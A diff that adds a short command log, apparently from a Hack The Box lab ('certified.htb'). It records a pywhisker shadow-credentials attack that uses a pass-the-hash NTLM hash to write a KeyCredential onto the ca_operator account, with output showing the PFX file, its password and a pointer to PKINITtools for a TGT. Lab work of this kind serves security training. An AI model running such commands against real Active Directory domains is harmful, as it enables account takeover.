@@ -1,0 +1,18 @@
+### [2026-04-06 16:02:06] pywhisker -d certified.htb -u management_svc -H a091c1832bcdd4677c28b5a6a1295584 --target ca_operator --action add
+
+$ pywhisker -d certified.htb -u management_svc -H a091c1832bcdd4677c28b5a6a1295584 --target ca_operator --action add
+
+[*] Searching for the target account
+[*] Target user found: CN=operator ca,CN=Users,DC=certified,DC=htb
+[*] Generating certificate
+[*] Certificate generated
+[*] Generating KeyCredential
+[*] KeyCredential generated with DeviceID: 19a46567-fbc5-5b41-baa4-868a409745b6
+[*] Updating the msDS-KeyCredentialLink attribute of ca_operator
+[+] Updated the msDS-KeyCredentialLink attribute of the target object
+[+] Saved PFX (#PKCS12) certificate & key at path: ELnnqsrR.pfx
+[*] Must be used with password: 0tIfRJ6JeltPZu3Z8b3b
+[*] A TGT can now be obtained with https://github.com/dirkjanm/PKINITtools
+
+# Exit code: 0
+# Duration: 2026-04-06 16:02:07
